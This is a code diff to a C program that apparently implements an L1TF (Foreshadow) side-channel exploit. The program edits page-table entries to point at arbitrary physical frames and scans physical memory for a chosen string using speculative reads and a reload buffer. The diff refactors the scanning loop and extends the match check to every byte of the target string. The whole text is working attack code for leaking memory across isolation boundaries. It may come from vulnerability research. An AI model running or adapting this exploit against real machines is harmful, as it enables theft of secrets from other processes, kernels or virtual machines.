@@ -80,7 +80,6 @@ leak_addr_t l1tf_leak_buffer_create() {
 
 void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
   size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
-  // ptedit_pte_set_pfn(leak->leak, 0, pfn);
   size_t current_pte = *(leak->pte_ptr);
   *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
 }
@@ -159,33 +158,51 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   ptedit_cleanup();
 }
 
-void *l1tf_scan_physical_memory(uintptr_t start, uintptr_t end, size_t stride,
-                                size_t needle_size, char needle[needle_size]) {
+void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
+                                char needle[needle_size],
+                                full_reload_buffer_t reload_buffer,
+                                leak_addr_t leak) {
   assert(needle_size > 0);
-  assert(needle_size < stride);
+  assert(needle_size < scan_opts.stride);
 
+  for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end;
+       ptr += scan_opts.stride, ++i) {
+    if (i % 100000 == 0) {
+      fprintf(stderr, "%.2f%%\r",
+              ((double)ptr / (double)scan_opts.end) * (double)100);
+    }
+    l1tf_leak_buffer_modify(&leak, (void *)ptr);
+
+    bool found = true;
+    for (size_t idx = 0; idx < needle_size; ++idx) {
+      found &=
+          l1tf_check(((char *)leak.leak + idx), reload_buffer, needle[idx]);
+    }
+
+    if (found) {
+      return (void *)ptr;
+    }
+  }
+  return NULL;
+}
+
+void do_scan(scan_opts_t scan_opts, size_t needle_size,
+             char needle[needle_size]) {
   initialize_pteditor_lib();
   full_reload_buffer_t reload_buffer = {0};
   leak_addr_t leak = l1tf_leak_buffer_create();
 
-  void *ret = NULL;
-
-  for (uintptr_t ptr = start, i = 0; ptr < end; ptr += stride, ++i) {
-    if (i % 100000 == 0) {
-      fprintf(stderr, "%.2f%%\r", ((double)ptr / (double)end) * (double)100);
-    }
-    l1tf_leak_buffer_modify(&leak, (void *)ptr);
-
-    // TODO: actually do something with the other characters
-    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
-      ret = (void *)ptr;
-      break;
-    }
+  void *phys_addrs = l1tf_scan_physical_memory(scan_opts, needle_size, needle,
+                                               reload_buffer, leak);
+  if (phys_addrs) {
+    printf("Found needle at %p\n", phys_addrs);
+  } else {
+    printf("Did not find the needle in physical memory\n");
   }
 
   l1tf_leak_buffer_free(&leak);
   ptedit_cleanup();
-  return ret;
+  return;
 }
 
 // If you already know a physical address that you want to leak
@@ -314,15 +331,12 @@ int main_scan(const int argc, char *argv[argc]) {
           "Starting to scan for matches in the range 0x%lx-0x%lx for the "
           "string\n\t\"%s\"\n",
           start_addr, end_addr, needle);
-  void *matching_phys_addr = l1tf_scan_physical_memory(
-      start_addr, end_addr, stride, needle_size, needle);
-  if (matching_phys_addr) {
-    printf("Found a matching phys addr at %p!\n", matching_phys_addr);
-    exit(0);
-  } else {
-    printf("Failed to find a matching phys addr\n");
-    exit(1);
-  }
+  scan_opts_t scan_ops;
+  scan_ops.start = start_addr;
+  scan_ops.end = end_addr;
+  scan_ops.stride = stride;
+  do_scan(scan_ops, needle_size, needle);
+  return 0;
 }
 
 int main(int argc, char *argv[argc]) {
